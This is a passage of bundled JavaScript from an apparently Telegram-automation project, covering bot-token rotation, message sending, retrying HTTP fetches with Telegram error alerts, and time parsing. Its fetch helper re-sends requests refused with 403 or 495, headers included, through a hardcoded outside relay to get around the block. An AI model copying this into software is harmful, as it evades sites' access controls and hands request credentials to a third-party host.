            if (this.initialized) {
                return;
            }
            if (!this.initPromise) {
                // This is a fallback if somehow the constructor initialization failed
                this.initPromise = this.initialize();
            }
            return this.initPromise;
        });
    }
    /**
     * Initialize the configuration by fetching bot data
     */
    initialize() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.initialized || this.initializing) {
                return;
            }
            try {
                this.initializing = true;
                console.debug('Initializing Telegram channel configuration...');
                const envKeys = Object.keys(process.env).filter(key => key.startsWith('TELEGRAM_CHANNEL_CONFIG_'));
                for (const key of envKeys) {
                    const value = process.env[key];
                    if (!value)
                        continue;
                    try {
                        const [channelId, description = '', botTokensStr] = value.split('::');
                        const botTokens = botTokensStr === null || botTokensStr === void 0 ? void 0 : botTokensStr.split(',').map(t => t.trim()).filter(Boolean);
                        if (!channelId || !botTokens || botTokens.length === 0) {
                            console.warn(`Invalid configuration for ${key}: missing channelId or botTokens`);
                            continue;
                        }
                        const category = this.getCategoryFromDescription(description);
                        if (!category) {
                            console.warn(`Invalid category in description for ${key}: ${description}`);
                            continue;
                        }
                        const botUsernames = [];
                        for (const token of botTokens) {
                            try {
                                const username = yield this.fetchUsername(token);
                                if (!username) {
                                    console.warn(`Invalid bot token in ${category}`);
                                    continue;
                                }
                                botUsernames.push(username);
                            }
                            catch (error) {
                                console.error(`Error fetching username for token in ${category}:`, error);
                            }
                        }
                        if (botUsernames.length === 0) {
                            console.warn(`No valid bot usernames found for ${category}`);
                            continue;
                        }
                        this.categoryMap.set(category, {
                            botTokens,
                            botUsernames,
                            lastUsedIndex: -1,
                            channelId,
                        });
                    }
                    catch (error) {
                        console.error(`Error processing configuration for ${key}:`, error);
                    }
                }
                // Initialize bots after configuration is loaded
                yield this.initializeBots();
                this.initialized = true;
                console.info(`BotConfig initialized successfully with ${this.categoryMap.size} categories.`);
            }
            catch (error) {
                console.error('Failed to initialize BotConfig:', error);
                if (this.initRetries < this.MAX_RETRIES) {
                    this.initRetries++;
                    console.info(`Retrying initialization (attempt ${this.initRetries}/${this.MAX_RETRIES})...`);
                    // Reset state for retry
                    this.initializing = false;
                    this.initPromise = null;
                    // Wait before retrying
                    yield new Promise(resolve => setTimeout(resolve, this.RETRY_DELAY));
                    return this.initialize();
                }
                else {
                    console.error(`Failed to initialize after ${this.MAX_RETRIES} attempts`);
                    throw error;
                }
            }
            finally {
                this.initializing = false;
            }
        });
    }
    /**
     * Extract category from description string
     */
    getCategoryFromDescription(desc) {
        var _a;
        if (!desc)
            return null;
        const normalized = desc.trim().toUpperCase();
        return (_a = Object.values(ChannelCategory).find(cat => normalized.includes(cat) || cat.includes(normalized))) !== null && _a !== void 0 ? _a : null;
    }
    /**
     * Fetch bot username from token
     */
    fetchUsername(token) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            if (!token || typeof token !== 'string' || token.length < 10) {
                return '';
            }
            try {
                const res = yield axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
                    timeout: 5000 // 5 second timeout
                });
                return ((_a = res.data) === null || _a === void 0 ? void 0 : _a.ok) ? res.data.result.username : '';
            }
            catch (error) {
                console.error('Error fetching bot username:', error);
                return '';
            }
        });
    }
    /**
     * Get bot username for specified category
     */
    getBotUsername(category) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.ensureInitialized();
            const data = this.categoryMap.get(category);
            if (!data || data.botUsernames.length === 0) {
                throw new Error(`No valid bots configured for ${category}`);
            }
            data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
            return data.botUsernames[data.lastUsedIndex];
        });
    }
    /**
     * Get channel ID for specified category
     */
    getChannelId(category) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.ensureInitialized();
            const data = this.categoryMap.get(category);
            if (!data) {
                throw new Error(`No configuration found for ${category}`);
            }
            return data.channelId;
        });
    }
    /**
     * Get bot username, channel ID and token for specified category
     */
    getBotAndChannel(category) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.ensureInitialized();
            const data = this.categoryMap.get(category);
            if (!data || data.botUsernames.length === 0) {
                throw new Error(`No valid bots configured for ${category}`);
            }
            data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
            return {
                username: data.botUsernames[data.lastUsedIndex],
                channelId: data.channelId,
                token: data.botTokens[data.lastUsedIndex],
            };
        });
    }
    /**
     * Send message to a channel using the configured bot
     */
    sendMessage(category_1, message_1) {
        return __awaiter(this, arguments, void 0, function* (category, message, options = {}) {
            var _a;
            yield this.ensureInitialized();
            const data = this.categoryMap.get(category);
            if (!data || data.botTokens.length === 0) {
                throw new Error(`No valid bots configured for ${category}`);
            }
            // Get the next bot in rotation
            data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
            const botIndex = data.lastUsedIndex;
            const token = data.botTokens[botIndex];
            const channelId = data.channelId;
            // Prepare request parameters
            const params = new URLSearchParams({
                chat_id: channelId,
                text: message,
            });
            if (options.parseMode)
                params.append('parse_mode', options.parseMode);
            if (options.disableWebPagePreview)
                params.append('disable_web_page_preview', 'true');
            if (options.disableNotification)
                params.append('disable_notification', 'true');
            if (options.replyToMessageId)
                params.append('reply_to_message_id', options.replyToMessageId.toString());
            if (options.allowSendingWithoutReply)
                params.append('allow_sending_without_reply', 'true');
            if (options.protectContent)
                params.append('protect_content', 'true');
            // Handle link preview options
            if (options.linkPreviewOptions) {
                const { isDisabled, url, preferSmallMedia, preferLargeMedia, showAboveText } = options.linkPreviewOptions;
                if (isDisabled)
                    params.append('disable_web_page_preview', 'true');
                if (url)
                    params.append('link_preview_url', url);
                if (preferSmallMedia)
                    params.append('prefer_small_media', 'true');
                if (preferLargeMedia)
                    params.append('prefer_large_media', 'true');
                if (showAboveText)
                    params.append('show_above_text', 'true');
            }
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            // Try to send the message
            try {
                const response = yield axios_1.default.post(url, params, {
                    timeout: 10000 // 10 second timeout
                });
                return ((_a = response.data) === null || _a === void 0 ? void 0 : _a.ok) === true;
            }
            catch (error) {
                console.error(`Failed to send message to ${channelId} using bot at index ${botIndex}:`, error);
                // Try with another bot if available
                if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
                    console.debug(`Retrying with next available bot for ${category}`);
                    data.lastUsedIndex = botIndex; // Will be incremented in the recursive call
                    return this.sendMessage(category, message, options);
                }
                throw error;
            }
        });
    }
    /**
     * Initialize bots with /start command
     */
    initializeBots() {
        return __awaiter(this, void 0, void 0, function* () {
            console.debug('Initializing bots with /start command...');
            const initPromises = [];
            for (const [category, data] of this.categoryMap) {
                for (const token of data.botTokens) {
                    const promise = (() => __awaiter(this, void 0, void 0, function* () {
                        var _a;
                        try {
                            const botInfo = yield axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
                                timeout: 5000
                            });
                            if (!((_a = botInfo.data) === null || _a === void 0 ? void 0 : _a.ok)) {
                                console.error(`Failed to get bot info for ${category}`);
                                return;
                            }
                            console.debug(`Successfully initialized bot for ${category}`);
                        }
                        catch (error) {
                            console.error(`Failed to initialize bot for ${category}:`, error);
                        }
                    }))();
                    initPromises.push(promise);
                }
            }
            // Wait for all initialization attempts to complete
            yield Promise.allSettled(initPromises);
        });
    }
    /**
     * Ensure the class is initialized before performing operations
     */
    ensureInitialized() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.initialized) {
                yield this.ready();
                if (!this.initialized) {
                    throw new Error('BotConfig initialization failed. Unable to proceed.');
                }
            }
        });
    }
    /**
     * Check if a category is configured
     */
    hasCategory(category) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.ensureInitialized();
            return this.categoryMap.has(category);
        });
    }
    /**
     * Get all configured categories
     */
    getConfiguredCategories() {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.ensureInitialized();
            return Array.from(this.categoryMap.keys());
        });
    }
}
exports.BotConfig = BotConfig;


/***/ }),

/***/ "./src/utils/fetchWithTimeout.ts":
/*!***************************************!*\
  !*** ./src/utils/fetchWithTimeout.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.fetchWithTimeout = fetchWithTimeout;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
// Default configurations
const DEFAULT_RETRY_CONFIG = {
    maxRetries: 3,
    baseDelay: 500, // Start with 500ms
    maxDelay: 30000, // Cap at 30 seconds
    jitterFactor: 0.2, // Add up to 20% jitter
};
const DEFAULT_NOTIFICATION_CONFIG = {
    enabled: true,
    channelEnvVar: 'httpFailuresChannel',
    timeout: 5000,
};
/**
 * Sends error notifications to configured channels
 * @param prefix - Notification message prefix
 * @param errorDetails - Error details to include in notification
 * @param config - Notification configuration
 * @returns Promise that resolves when notification is sent
 */
function notifyInternal(prefix_1, errorDetails_1) {
    return __awaiter(this, arguments, void 0, function* (prefix, errorDetails, config = DEFAULT_NOTIFICATION_CONFIG) {
        if (!config.enabled)
            return;
        try {
            const errorMessage = typeof errorDetails.message === 'string'
                ? errorDetails.message
                : JSON.stringify(errorDetails.message);
            const formattedMessage = errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :
                errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :
                    (0, parseError_1.extractMessage)(errorDetails === null || errorDetails === void 0 ? void 0 : errorDetails.message);
            console.error(`${prefix}\n${formattedMessage}`);
            // Skip notification for rate limiting errors
            if (errorDetails.status === 429)
                return;
            const notificationText = `${prefix}\n\n${formattedMessage}`;
            try {
                const channelUrl = (0, logbots_1.ppplbot)(process.env[config.channelEnvVar] || '');
                if (!channelUrl) {
                    console.warn(`Notification channel URL not available. Environment variable ${config.channelEnvVar} might not be set.`);
                    return;
                }
                const notifUrl = `${channelUrl}&text=${encodeURIComponent(notificationText)}`;
                yield axios_1.default.get(notifUrl, { timeout: config.timeout });
            }
            catch (error) {
                console.error("Failed to send notification:", error);
            }
        }
        catch (error) {
            console.error("Error in notification process:", error);
        }
    });
}
/**
 * Common network errors that should trigger retries
 */
const RETRYABLE_NETWORK_ERRORS = [
    'ETIMEDOUT',
    'ECONNABORTED',
    'ECONNREFUSED',
    'ECONNRESET',
    'ERR_NETWORK',
    'ERR_BAD_RESPONSE',
    'EHOSTUNREACH',
    'ENETUNREACH'
];
/**
 * HTTP status codes that should trigger retries
 */
const RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];
/**
 * Determines if an error should trigger a retry
 * @param error - The axios error
 * @param parsedError - Parsed error with status code
 * @returns boolean indicating whether to retry the request
 */
function shouldRetry(error, parsedError) {
    var _a;
    if (axios_1.default.isAxiosError(error)) {
        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {
            return true;
        }
        if ((_a = error.message) === null || _a === void 0 ? void 0 : _a.toLowerCase().includes('timeout')) {
            return true;
        }
    }
    return RETRYABLE_STATUS_CODES.includes(parsedError.status);
}
/**
 * Calculates backoff time for retry attempts
 * @param attempt - Current attempt number (0-based)
 * @param config - Retry configuration
 * @returns Delay in milliseconds before next retry
 */
function calculateBackoff(attempt, config = DEFAULT_RETRY_CONFIG) {
    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);
    const jitter = Math.random() * (base * config.jitterFactor);
    return Math.floor(base + jitter);
}
/**
 * Makes a request through a bypass service when regular requests fail with certain errors
 * @param url - Target URL
 * @param options - Request options
 * @returns Axios response from bypass service
 */
function makeBypassRequest(url, options) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d, _e;
        const bypassUrl = options.bypassUrl || process.env.bypassURL || '';
        if (!bypassUrl) {
            throw new Error('Bypass URL is not provided');
        }
        const finalBypassUrl = bypassUrl.startsWith('http') ?
            bypassUrl :
            'https://ravishing-perception-production.up.railway.app/execute-request';
        const bypassAxios = axios_1.default.create({
            responseType: options.responseType || 'json',
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: options.timeout || 30000
        });
        const response = yield bypassAxios.post(finalBypassUrl, {
            url,
            method: options.method,
            headers: options.headers,
            data: options.data,
            params: options.params,
            responseType: options.responseType,
            timeout: options.timeout,
            followRedirects: options.maxRedirects !== 0,
            maxRedirects: options.maxRedirects
        }, {
            headers: Object.assign({ 'Content-Type': 'application/json' }, options.headers)
        });
        // Handle binary responses
        if (response && (options.responseType === 'arraybuffer' ||
            ((_a = response.headers['content-type']) === null || _a === void 0 ? void 0 : _a.includes('application/octet-stream')) ||
            ((_b = response.headers['content-type']) === null || _b === void 0 ? void 0 : _b.includes('image/')) ||
            ((_c = response.headers['content-type']) === null || _c === void 0 ? void 0 : _c.includes('audio/')) ||
            ((_d = response.headers['content-type']) === null || _d === void 0 ? void 0 : _d.includes('video/')) ||
            ((_e = response.headers['content-type']) === null || _e === void 0 ? void 0 : _e.includes('application/pdf')))) {
            response.data = Buffer.from(response.data);
        }
        return response;
    });
}
/**
 * Parses a URL and extracts host and endpoint information
 * @param url - URL to parse
 * @returns Object containing host and endpoint
 */
function parseUrl(url) {
    if (!url || typeof url !== 'string') {
        return null;
    }
    try {
        const parsedUrl = new URL(url);
        return {
            host: parsedUrl.host,
            endpoint: parsedUrl.pathname + parsedUrl.search
        };
    }
    catch (error) {
        return null;
    }
}
/**
 * Makes HTTP requests with timeout handling and retry logic
 * @param url - Target URL
 * @param options - Request options with custom extensions
 * @returns Promise resolving to Axios response or undefined if all retries fail
 */
function fetchWithTimeout(url_1) {
    return __awaiter(this, arguments, void 0, function* (url, options = {}, maxRetries // Kept for backward compatibility
    ) {
        var _a, _b;
        // Input validation
        if (!url) {
            console.error('URL is empty');
            return undefined;
        }
        // Merge default and custom configurations
        const retryConfig = Object.assign(Object.assign(Object.assign({}, DEFAULT_RETRY_CONFIG), options.retryConfig), { maxRetries: maxRetries !== undefined ? maxRetries : (((_a = options.retryConfig) === null || _a === void 0 ? void 0 : _a.maxRetries) || DEFAULT_RETRY_CONFIG.maxRetries) });
        const notificationConfig = Object.assign(Object.assign({}, DEFAULT_NOTIFICATION_CONFIG), options.notificationConfig);
        // Initialize request options with defaults
        options.timeout = options.timeout || 30000;
        options.method = options.method || "GET";
        // Parse URL for error reporting
        const urlInfo = parseUrl(url);
        if (!urlInfo) {
            console.error(`Invalid URL: ${url}`);
            return undefined;
        }
        const { host, endpoint } = urlInfo;
        const clientId = process.env.clientId || 'UnknownClient';
        // Main retry loop
        let lastError = null;
        for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {
            // Create controller for this attempt
            const controller = new AbortController();
            const currentTimeout = options.timeout + (attempt * 5000);
            // Set up timeout to abort the request if it takes too long
            const timeoutId = setTimeout(() => {
                try {
                    controller.abort();
                }
                catch (abortError) {
                    console.error("Error during abort:", abortError);
                }
            }, currentTimeout);
            try {
                // Make the request
                const response = yield (0, axios_1.default)(Object.assign(Object.assign({}, options), { url, signal: controller.signal, maxRedirects: (_b = options.maxRedirects) !== null && _b !== void 0 ? _b : 5, timeout: currentTimeout }));
                // Success! Clean up and return response
                clearTimeout(timeoutId);
                return response;
            }
            catch (error) {
                // Clean up timeout
                clearTimeout(timeoutId);
                // Process error and determine if retry is needed
                lastError = error instanceof Error ? error : new Error(String(error));
                // Try to parse the error for better handling
                let parsedError;
                try {
                    parsedError = (0, parseError_1.parseError)(error, `host: ${host}\nendpoint:${endpoint}`, false);
                }
                catch (parseErrorError) {
                    console.error("Error in parseError:", parseErrorError);
                    parsedError = { status: 500, message: String(error), error: "ParseError" };
                }
                // Extract message for notifications
                const message = parsedError.message;
                // Check if it's a timeout
                const isTimeout = axios_1.default.isAxiosError(error) && (error.code === "ECONNABORTED" ||
                    (message && message.includes("timeout")) ||
                    parsedError.status === 408);
                // Handle 403/495 with bypass
                if (parsedError.status === 403 || parsedError.status === 495) {
                    try {
                        const bypassResponse = yield makeBypassRequest(url, options);
                        if (bypassResponse) {
                            yield notifyInternal(`Successfully Bypassed the request`, { message: `${clientId} host=${host}\nendpoint=${endpoint}` }, notificationConfig);
                            return bypassResponse;
                        }
                    }
                    catch (bypassError) {
                        let errorDetails;
                        try {
                            const bypassParsedError = (0, parseError_1.parseError)(bypassError, `host: ${host}\nendpoint:${endpoint}`, false);
                            errorDetails = (0, parseError_1.extractMessage)(bypassParsedError);
                        }
                        catch (extractBypassError) {
                            console.error("Error extracting bypass error message:", extractBypassError);
                            errorDetails = String(bypassError);
                        }
                        yield notifyInternal(`Bypass attempt failed`, { message: `host=${host}\nendpoint=${endpoint}\n${errorDetails && errorDetails.length < 250 ? `msg: ${errorDetails}` : "msg: Message too long"}` }, notificationConfig);
                    }
                }
                else {
                    // Notify about the error
                    if (isTimeout) {
                        yield notifyInternal(`Request timeout on attempt ${attempt}`, {
                            message: `${clientId} host=${host}\nendpoint=${endpoint}\ntimeout=${options.timeout}ms`,
                            status: 408
                        }, notificationConfig);
                    }
                    else {
                        yield notifyInternal(`Attempt ${attempt} failed`, {
                            message: `${clientId} host=${host}\nendpoint=${endpoint}\n${message && message.length < 250 ? `msg: ${message}` : "msg: Message too long"}`,
                            status: parsedError.status
                        }, notificationConfig);
                    }
                }
                // Check if we should retry
                if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {
                    const delay = calculateBackoff(attempt, retryConfig);
                    console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);
                    yield (0, Helpers_1.sleep)(delay);
                    continue;
                }
                // If this is the last attempt, break out of the loop
                if (attempt >= retryConfig.maxRetries) {
                    break;
                }
            }
        }
        // If we get here, all retries failed
        try {
            let errorData;
            try {
                if (lastError) {
                    const parsedLastError = (0, parseError_1.parseError)(lastError, `${clientId} host: ${host}\nendpoint:${endpoint}`, false);
                    errorData = (0, parseError_1.extractMessage)(parsedLastError);
                }
                else {
                    errorData = 'Unknown error';
                }
            }
            catch (extractLastError) {
                console.error("Error extracting last error:", extractLastError);
                errorData = String(lastError) || 'Unknown error';
            }
            yield notifyInternal(`All ${retryConfig.maxRetries} retries exhausted`, { message: `${errorData && errorData.length < 250 ? `msg: ${errorData}` : "msg: Message too long"}` }, notificationConfig);
        }
        catch (finalError) {
            console.error('Failed to send final error notification:', finalError);
        }
        // Return undefined to indicate failure
        return undefined;
    });
}


/***/ }),

/***/ "./src/utils/isWithinPastTenMinutes.ts":
/*!*********************************************!*\
  !*** ./src/utils/isWithinPastTenMinutes.ts ***!
  \*********************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports["default"] = isWithinPastTenMinutes;
const fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const british = 'en-GB';
const timeConfig = { hour: '2-digit', minute: '2-digit', hour12: false };
const dateConfig = { day: '2-digit', month: '2-digit' };
const timeZone = 'Asia/Kolkata';
function parseDatePart(datePart, defaultValue) {
    if (!datePart)
        return defaultValue;
    const [day, month] = datePart.split('/').map(Number);
    if (isNaN(day) || isNaN(month) || day <= 0 || day > 31 || month <= 0 || month > 12) {
        return defaultValue;
    }
    return [day, month];
}
function isWithinPastTenMinutes(input) {
    var _a, _b, _c, _d;
    try {
        if (!input) {
            console.log(`invalid time\ninput: ${input}`);
            (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toUpperCase()}: invalid time\ninput: ${input}`)}`);
            return { isValid: false, result: false };
        }
        let isValid = true;
        const [timePart, datePart] = input.split(' ');
        const now = new Date();
        if (!timePart) {
            (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(_b = process.env.clientId) === null || _b === void 0 ? void 0 : _b.toUpperCase()}: invalid time\ninput: ${input}`)}`);
            return { isValid: false, result: false };
        }
        let [day, month] = parseDatePart(datePart, [now.getDate(), now.getMonth() + 1]);
        let [hours, minutes] = timePart.split(':').map(Number);
        const nowInIST = new Date(now.toLocaleString('en-US', { timeZone }));
        const inputDateInIST = new Date(nowInIST.getFullYear(), month - 1, day, hours, minutes);
        const nowInISTMs = nowInIST.getTime();
        let inputDateInISTMS = inputDateInIST.getTime();
        const tenMinutesAgoInISTMs = nowInISTMs - 10 * 60 * 1000;
        let timeReport = `${new Date(nowInIST).toLocaleTimeString(british, timeConfig)} ${new Date(nowInIST).toLocaleDateString(british, dateConfig)} vs ${new Date(inputDateInISTMS).toLocaleTimeString(british, timeConfig)} ${new Date(inputDateInISTMS).toLocaleDateString(british, dateConfig)}`;
        const result = inputDateInISTMS >= tenMinutesAgoInISTMs && inputDateInISTMS <= nowInISTMs;
        if (!result) {
            const twelveHoursInMilliseconds = 12 * 60 * 60 * 1000;
            const fifteenMinutesInMilliseconds = 15 * 60 * 1000;
            const timeDifference = nowInISTMs - inputDateInISTMS;
            if (inputDateInISTMS > nowInISTMs &&
                Math.abs(timeDifference + twelveHoursInMilliseconds) <= fifteenMinutesInMilliseconds) {
                // Subtract 12 hours if input is ahead within the 12 hours ±15 minute range
                inputDateInIST.setTime(inputDateInIST.getTime() - twelveHoursInMilliseconds);
                inputDateInISTMS = inputDateInIST.getTime();
                timeReport = `${new Date(nowInIST).toLocaleTimeString(british, timeConfig)} ${new Date(nowInIST).toLocaleDateString(british, dateConfig)} vs ${new Date(inputDateInISTMS).toLocaleTimeString(british, timeConfig)} ${new Date(inputDateInISTMS).toLocaleDateString(british, dateConfig)}`;
                console.log(`input time ahead by ~12hrs, subtracting 12hrs\ninput: ${input}\n${timeReport}`);
                (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(_c = process.env.clientId) === null || _c === void 0 ? void 0 : _c.toUpperCase()}: input time ahead by ~12hrs, subtracting 12hrs\ninput: ${input}\n\n${timeReport}`)}`);
                // Condition: Input time is behind current time by more than 12 hours and within the ±15 min window
            }
            else if (timeDifference > twelveHoursInMilliseconds - fifteenMinutesInMilliseconds &&
                timeDifference < twelveHoursInMilliseconds + fifteenMinutesInMilliseconds) {
                // Add 12 hours if input is behind by more than 12 hours but within the range
                inputDateInIST.setTime(inputDateInIST.getTime() + twelveHoursInMilliseconds);
                inputDateInISTMS = inputDateInIST.getTime();
                timeReport = `${new Date(nowInIST).toLocaleTimeString(british, timeConfig)} ${new Date(nowInIST).toLocaleDateString(british, dateConfig)} vs ${new Date(inputDateInISTMS).toLocaleTimeString(british, timeConfig)} ${new Date(inputDateInISTMS).toLocaleDateString(british, dateConfig)}`;
                console.log(`input time behind by ~12hrs, adding 12hrs\ninput: ${input}\n${timeReport}`);
                (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(_d = process.env.clientId) === null || _d === void 0 ? void 0 : _d.toUpperCase()}: input time behind by ~12hrs, adding 12hrs\ninput: ${input}\n\n${timeReport}`)}`);
            }
            const newResult = inputDateInISTMS >= tenMinutesAgoInISTMs && inputDateInISTMS <= nowInISTMs;
            return { isValid, result: newResult, time: timeReport };
        }
        else {
            return { isValid, result, time: timeReport };
        }
    }
    catch (error) {
        console.error(error);
        (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: invalid time\ninput: ${input}\nerror:${(0, parseError_1.parseError)(error).message}`)}`);
        return { isValid: false, result: false };
    }
}


/***/ }),

/***/ "./src/utils/logbots.ts":
/*!******************************!*\
  !*** ./src/utils/logbots.ts ***!
  \******************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getBotToken = getBotToken;
exports.notifbot = notifbot;
exports.ppplbot = ppplbot;
const getBotTokens = () => {
    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
    if (botTokens.length === 0) {
        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
    }
    return botTokens;
};
let botTokens = null;
let currentTokenIndex = 0;
const initializeBotTokens = () => {
    if (botTokens === null) {
        botTokens = getBotTokens();
    }
    return botTokens;
};
function getBotToken() {
    return initializeBotTokens()[currentTokenIndex];
}
function notifbot(chatId = process.env.notifChannel || "-1001823103248", botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}
function ppplbot(chatId = process.env.updatesChannel || '-1001972065816', botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}


/***/ }),

/***/ "./src/utils/parseError.ts":
/*!*********************************!*\
  !*** ./src/utils/parseError.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ErrorUtils = void 0;
exports.extractMessage = extractMessage;
exports.parseError = parseError;
exports.isAxiosError = isAxiosError;
exports.createError = createError;
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
// Default configuration for error handling
const DEFAULT_ERROR_CONFIG = {
    maxMessageLength: 200,
    notificationTimeout: 10000,
    ignorePatterns: [
        /INPUT_USER_DEACTIVATED/i,
        /too many req/i,
        /could not find/i,
        /ECONNREFUSED/i
    ],
    defaultStatus: 500,
    defaultMessage: 'An unknown error occurred',
    defaultError: 'UnknownError'
};
/**
 * Safely stringifies objects of any depth
 * @param data - Data to stringify
 * @param depth - Current recursion depth
 * @param maxDepth - Maximum recursion depth
 * @returns String representation of data
 */
function safeStringify(data, depth = 0, maxDepth = 3) {
    if (depth > maxDepth) {
        return '[Max Depth Reached]';
    }
    try {
        if (data === null || data === undefined) {
            return String(data);
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return String(data);
        }
        if (data instanceof Error) {
            return data.message || data.toString();
        }
        if (Array.isArray(data)) {
            if (data.length === 0)
                return '[]';
            return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;
        }
        if (typeof data === 'object') {
            const entries = Object.entries(data)
                .filter(([_, v]) => v !== undefined && v !== null)
                .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);
            if (entries.length === 0)
                return '{}';
            return `{${entries.join(', ')}}`;
        }
        return String(data);
    }
    catch (error) {
        return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;
    }
}
/**
 * Extracts meaningful message from nested data structure
 * @param data - The data to extract messages from
 * @param path - Current object path for nested values
 * @param maxDepth - Maximum depth to traverse
 * @returns Extracted message as string
 */
function extractMessage(data, path = '', depth = 0, maxDepth = 5) {
    try {
        // Prevent excessive recursion
        if (depth > maxDepth) {
            return `${path}=[Max Depth Reached]`;
        }
        // Handle simple types directly
        if (data === null || data === undefined) {
            return '';
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return path ? `${path}=${data}` : String(data);
        }
        // Handle Error objects
        if (data instanceof Error) {
            const errorInfo = [
                data.message ? `message=${data.message}` : '',
                data.name ? `name=${data.name}` : '',
                data.stack ? `stack=${data.stack.split('\n')[0]}` : ''
            ].filter(Boolean).join('\n');
            return path ? `${path}=(${errorInfo})` : errorInfo;
        }
        // Handle arrays
        if (Array.isArray(data)) {
            if (data.length === 0) {
                return '';
            }
            return data
                .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))
                .filter(Boolean)
                .join('\n');
        }
        // Handle objects
        if (typeof data === 'object') {
            const messages = [];
            for (const key of Object.keys(data)) {
                const value = data[key];
                const newPath = path ? `${path}.${key}` : key;
                const extracted = extractMessage(value, newPath, depth + 1, maxDepth);
                if (extracted) {
